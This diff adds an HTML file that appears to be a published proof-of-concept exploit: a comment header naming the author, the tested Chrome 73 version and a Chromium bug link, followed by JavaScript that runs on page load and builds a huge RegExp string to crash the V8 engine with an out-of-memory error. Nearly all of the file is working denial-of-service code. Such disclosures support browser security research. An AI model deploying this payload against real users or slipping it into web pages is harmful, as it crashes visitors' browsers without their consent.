@@ -1,0 +1,47 @@
+<!--
+# Exploit Title: Google Chrome 73.0.3683.103 V8 JavaScript Engine - Out-of-memory in invalid table size . Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2019-04-20
+# Exploit Author: Bogdan Kurinnoy (b.kurinnoy@gmail.com)
+# Vendor Homepage: https://www.google.com/
+# Version: Google Chrome 73.0.3683.103
+# Tested on: Windows x64
+# CVE : N/A
+
+# Description:
+
+# Fatal javascript OOM in invalid table size 
+
+# https://bugs.chromium.org/p/chromium/issues/detail?id=918301
+-->
+
+
+<html>
+<head>
+<script>
+
+var arr1 = [0,1];
+
+function ObjCreate(make) {
+  this.make = make;
+}
+
+var obj1 = new ObjCreate();
+
+function main() {
+
+	arr1.reduce(f3); 
+
+	Object.getOwnPropertyDescriptors(Array(99).join(obj1.make));
+
+}
+
+function f3() {
+
+	obj1["make"] = RegExp(Array(60000).join("CCC")); 
+}
+
+</script>
+</head>
+<body onload=main()></body>
+</html>
